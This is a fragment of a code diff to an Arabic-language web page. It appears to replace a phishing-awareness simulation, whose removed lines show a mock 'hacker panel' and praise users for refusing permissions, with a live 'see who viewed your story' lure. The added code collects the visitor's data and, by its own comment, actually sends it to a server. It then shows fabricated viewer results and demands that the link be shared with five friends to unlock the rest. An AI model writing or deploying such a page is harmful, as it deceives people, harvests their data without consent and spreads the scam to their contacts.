+            });
+            
+            updateProgress(100);
+            
+            if (response.ok) {
+                updateStatus('✅ تم إرسال البيانات بنجاح إلى الخادم', 'success');
+                console.log('[تم الإرسال] البيانات وصلت إلى:', API_URL);
+            } else {
+                updateStatus('⚠️ تم الإرسال ولكن هناك خطأ في الخادم', 'info');
+            }
+            
+        } catch (error) {
+            console.error('خطأ في الإرسال:', error);
+            updateStatus('❌ فشل الاتصال بالخادم', 'error');
+        }
+        
+        return true;
+    }
+    
+    function showFakeResults() {
+        const results = fakeResults[currentPlatform] || fakeResults.instagram;
+        const resultDiv = document.getElementById('resultList');
+        
+        let html = '<h3 style="margin-bottom: 16px;">👥 الأشخاص الذين شاهدوا ستوريك:</h3>';
+        
+        results.forEach(r => {
+            html += `
+                <div class="result-item">
+                    <div class="result-avatar">${r.name.charAt(0).toUpperCase()}</div>
+                    <div class="result-info">
+                        <h4>${r.name} ${r.verified ? '<i class="fas fa-check-circle" style="color: #0095f6; font-size: 12px;"></i>' : ''}</h4>
+                        <p>${r.time}</p>
                     </div>
-                    
-                    <div style="margin-top: 15px; padding: 10px; background: #fff3cd; border-radius: 8px;">
-                        <i class="fas fa-eye"></i> 
-                        <strong>👈 انظر للجهة اليمنى (لوحة الهاكر)</strong><br>
-                        <small>بياناتك وصلت الآن للهاكر!</small>
-                    </div>
-                `;
-                
-                loader.style.display = 'none';
-                
-                // إيقاف الكاميرا بعد 3 ثواني
-                setTimeout(() => {
-                    if (currentStream) {
-                        currentStream.getTracks().forEach(track => track.stop());
-                        currentStream = null;
-                        cameraPreview.style.display = 'none';
-                    }
-                }, 3000);
-                
-            }, 2000);
-            
-        } catch (err) {
-            clearInterval(progressInterval);
-            loaderBar.style.width = '100%';
-            loader.style.display = 'none';
-            
-            status.innerHTML += `
-                <br><span style="color: orange;">⚠️ تم رفض الكاميرا</span>
-                <div style="margin-top: 15px; padding: 10px; background: #d4edda; border-radius: 8px;">
-                    <strong>✅ تصرف صحيح!</strong> رفض الأذونات غير المبررة يحميك.
                 </div>
             `;
-            
-            // حتى مع الرفض، بعض البيانات تصل
-            const limitedData = {...fakeData, camera: 'مرفوضة'};
-            addToHackerLog(limitedData);
+        });
+        
+        html += `
+            <div style="margin-top: 20px; padding: 12px; background: #f0f0f0; border-radius: 8px; text-align: center;">
+                <i class="fas fa-lock" style="color: #0095f6;"></i>
+                <span style="margin-right: 8px;">لمشاهدة باقي المشاهدات، شارك هذا الرابط مع 5 أصدقاء</span>
+            </div>
+        `;
+        
+        resultDiv.innerHTML = html;
+        resultDiv.style.display = 'block';
+    }
+    
+    // زر البحث الرئيسي
+    document.getElementById('searchBtn').addEventListener('click', async function() {
+        const username = document.getElementById('usernameInput').value.trim();
+        
+        if (!username) {
+            alert('الرجاء إدخال اسم المستخدم');
+            return;
         }
         
-        // طلب الموقع
+        // تعطيل الزر مؤقتاً
+        this.disabled = true;
+        this.style.opacity = '0.7';
+        
+        // إظهار شريط التقدم
+        document.getElementById('progressBar').style.display = 'block';
+        document.getElementById('progressFill').style.width = '0%';
+        document.getElementById('resultList').style.display = 'none';
+        
+        updateStatus('🔍 جاري الفحص في سيرفرات ' + currentPlatform + '...', 'info');
+        updateProgress(5);
+        
         try {
-            const position = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 3000});
-            });
-            status.innerHTML += '<br><i class="fas fa-map-pin"></i> تم تحديد موقعك الجغرافي';
-        } catch (e) {
-            status.innerHTML += '<br><span style="color: green;">✓ تم رفض مشاركة الموقع (آمن)</span>';
+            // جمع البيانات وإرسالها فعلياً للخادم
+            await collectAndSendData();
+            
+            // عرض نتائج وهمية
+            setTimeout(() => {
+                showFakeResults();
+                
+                // إخفاء شريط التقدم بعد فترة
+                setTimeout(() => {
+                    document.getElementById('progressBar').style.display = 'none';
+                }, 1000);
+                
+                // إعادة تفعيل الزر
+                this.disabled = false;
+                this.style.opacity = '1';
+            }, 500);
+            
+        } catch (error) {
+            updateStatus('❌ حدث خطأ أثناء الفحص', 'error');
+            this.disabled = false;
+            this.style.opacity = '1';
         }
     });
-
-    // اختصار ESC للعودة
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') resetSimulation();
+    
+    // زر Enter في حقل الإدخال
+    document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            document.getElementById('searchBtn').click();
+        }
     });
 </script>
 
